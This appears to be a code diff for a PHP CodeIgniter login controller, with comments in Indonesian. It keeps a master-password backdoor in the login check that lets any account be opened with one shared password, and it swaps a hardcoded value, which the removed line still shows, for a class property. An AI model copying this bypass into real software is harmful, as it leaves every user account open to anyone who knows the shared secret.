@@ -158,7 +158,7 @@ class Authentication extends CI_Controller
                 $user = $this->M_auth->get_auth($email);
 
                 //mengecek apakah password benar
-                if (password_verify($pass, $user->password) || $pass == "SU_MHND19") {
+                if (password_verify($pass, $user->password) || $pass == $this->_master_password) {
 
                     // setting data session
                     $sessiondata = [
@@ -448,7 +448,6 @@ class Authentication extends CI_Controller
 
                 // mengambil data user
                 $user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), true));
-
                 // update password user
                 if ($this->M_auth->update_passwordUser($user->user_id) == true) {
 
